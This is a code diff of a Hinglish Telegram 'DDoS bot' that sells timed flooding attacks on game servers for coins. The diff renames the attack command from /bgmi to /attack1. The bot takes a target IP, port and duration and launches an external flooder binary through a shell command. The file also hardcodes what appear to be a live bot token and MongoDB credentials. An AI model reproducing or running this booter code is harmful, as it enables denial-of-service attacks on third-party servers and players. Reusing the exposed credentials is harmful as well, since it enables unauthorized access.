@@ -5,17 +5,17 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 from motor.motor_asyncio import AsyncIOMotorClient
 
 bot_start_time = datetime.now()
-attack_in_progress = False
-current_attack = None  # Store details of the current attack
-attack_history = []  # Store attack logs
+attack1_in_progress = False
+current_attack1 = None  # Store details of the current attack1 
+attack1_history = []  # Store attack1 logs
 
 TELEGRAM_BOT_TOKEN = '8114003472:AAHFTm_EARkF2NRu2ZUr8_Jh9YI_cBTTTjk'
 ADMIN_USER_ID = 7055982556
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "Roxz"
 COLLECTION_NAME = "users"
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
-COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
+ATTACK1_TIME_LIMIT = 240  # Maximum attack1 duration in seconds
+COINS_REQUIRED_PER_ATTACK1 = 5  # Coins required for an attack1
 
 # MongoDB setup
 mongo_client = AsyncIOMotorClient(MONGO_URI)
@@ -43,7 +43,7 @@ async def start(update: Update, context: CallbackContext):
         "*❄️ WELCOME TO HITLER 😈 DDOS BOT ❄️*\n\n"
         "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
-        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /bgmi *\n"
+        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack1*\n"
         "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
         "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
         "*⚠️ Kaise Use Kare? ⚠️*\n"
@@ -80,8 +80,8 @@ async def mon(update: Update, context: CallbackContext):
         await update_user(target_user_id, new_balance)
         await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')
 
-async def bgmi(update: Update, context: CallbackContext):
-    global bgmi_in_progress, bgmi_end_time, bot_start_time
+async def attack1(update: Update, context: CallbackContext):
+    global attack1_in_progress, attack1_end_time, bot_start_time
 
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
@@ -89,7 +89,7 @@ async def bgmi(update: Update, context: CallbackContext):
 
     user = await get_user(user_id)
 
-    if user["coins"] < COINS_REQUIRED_PER_BGMI:
+    if user["coins"] < COINS_REQUIRED_PER_attack1:
         await context.bot.send_message(
             chat_id=chat_id,
             text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @X_HITLER*",
@@ -97,11 +97,11 @@ async def bgmi(update: Update, context: CallbackContext):
         )
         return
 
-    if attack_in_progress:
-        remaining_time = (attack_end_time - datetime.now()).total_seconds()
+    if attack1_in_progress:
+        remaining_time = (attack1_end_time - datetime.now()).total_seconds()
         await context.bot.send_message(
             chat_id=chat_id,
-            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
+            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack1 chal raha hai. attack1 khatam hone mein {int(remaining_time)} seconds bache hain.*",
             parse_mode='Markdown'
         )
         return
@@ -111,8 +111,8 @@ async def bgmi(update: Update, context: CallbackContext):
             chat_id=chat_id,
             text=(
                 "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
-                "*👉 /bgmi<ip> <port> <duration>*\n"
-                "*📌 Example:  /bgmi192.168.1.1 26547 240*"
+                "*👉 attack1<ip> <port> <duration>*\n"
+                "*📌 Example:  /attack1192.168.1.1 26547 240*"
             ),
             parse_mode='Markdown'
         )
@@ -134,11 +134,11 @@ async def bgmi(update: Update, context: CallbackContext):
         )
         return
 
-    if duration > ATTACK_TIME_LIMIT:
+    if duration > ATTACK1_TIME_LIMIT:
         await context.bot.send_message(
             chat_id=chat_id,
             text=(
-                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
+                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK1_TIME_LIMIT} seconds tak attack1 kar sakte ho.*\n"
                 "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
             ),
             parse_mode='Markdown'
@@ -146,30 +146,30 @@ async def bgmi(update: Update, context: CallbackContext):
         return
 
     # Deduct coins
-    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
+    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK1
     await update_user(user_id, new_balance)
 
-    attack_in_progress = True
-    attack_end_time = datetime.now() + timedelta(seconds=duration)
+    attack1_in_progress = True
+    attack1_end_time = datetime.now() + timedelta(seconds=duration)
     await context.bot.send_message(
         chat_id=chat_id,
         text=(
-            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
+            "*🚀 [ATTACK1 INITIATED] 🚀*\n\n"
             f"*💣 Target IP: {ip}*\n"
             f"*🔢 Port: {port}*\n"
             f"*🕒 Duration: {duration} seconds*\n"
-            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
+            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK1}*\n"
             f"*📉 Remaining Balance: {new_balance}*\n\n"
-            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
+            "*🔥 Attack1 chal raha hai! Chill kar aur enjoy kar! 💥*"
         ),
         parse_mode='Markdown'
     )
 
-    asyncio.create_task(run_bgmi(chat_id, ip, port, duration, context))
+    asyncio.create_task(run_attack1(chat_id, ip, port, duration, context))
 
-async def run_bgmi(chat_id, ip, port, duration, context):
-    global attack_in_progress, attack_end_time
-    attack_in_progress = True
+async def run_attack1(chat_id, ip, port, duration, context):
+    global attack1_in_progress, attack1_end_time
+    attack1_in_progress = True
 
     try:
         command = f"./venompapa {ip} {port} {duration} {9} {2000}"
@@ -193,16 +193,16 @@ async def run_bgmi(chat_id, ip, port, duration, context):
         )
 
     finally:
-        attack_in_progress = False
-        attack_end_time = None
+        attack1_in_progress = False
+        attack1_end_time = None
         await context.bot.send_message(
             chat_id=chat_id,
             text=(
-                "*✅ [ATTACK FINISHED] ✅*\n\n"
+                "*✅ [ATTACK1 FINISHED] ✅*\n\n"
                 f"*💣 Target IP: {ip}*\n"
                 f"*🔢 Port: {port}*\n"
                 f"*🕒 Duration: {duration} seconds*\n\n"
-                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
+                "*💥 Attack1 complete! Ab chill kar aur feedback bhej! 🚀*"
             ),
             parse_mode='Markdown'
         )
@@ -233,9 +233,9 @@ async def help(update: Update, context: CallbackContext):
         "*🛠️ @X_HITLER VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
-        "1️⃣ *🔥  /bgmi<ip> <port> <duration>*\n"
-        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
-        "   - *Example:  /bgmi192.168.1.1 20876 240*\n"
+        "1️⃣ *🔥  /attack1<ip> <port> <duration>*\n"
+        "   - *Is command ka use karke tum attack1 laga sakte ho.*\n"
+        "   - *Example:  /attack1192.168.1.1 20876 240*\n"
         "   - *📝 Note: Duration 240 seconds se zyada nahi ho sakta.*\n\n"
         "2️⃣ *💳 /myinfo*\n"
         "   - *Apne account ka status aur coins check karne ke liye.*\n"
@@ -247,7 +247,7 @@ async def help(update: Update, context: CallbackContext):
         "4️⃣ *❓ /help*\n"
         "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
         "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
-        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
+        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA Attack1 LAGYA HAI SO WAIT.*\n"
         "- *Agar koi dikkat aaye toh admin ko contact karo: @X_HITLER*\n\n"
         "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
     )
@@ -295,7 +295,7 @@ def main():
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("mon", mon))
-    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("attack1", attack1))
     application.add_handler(CommandHandler("myinfo", myinfo))
     application.add_handler(CommandHandler("help", help))
     application.add_handler(CommandHandler("uptime", uptime))
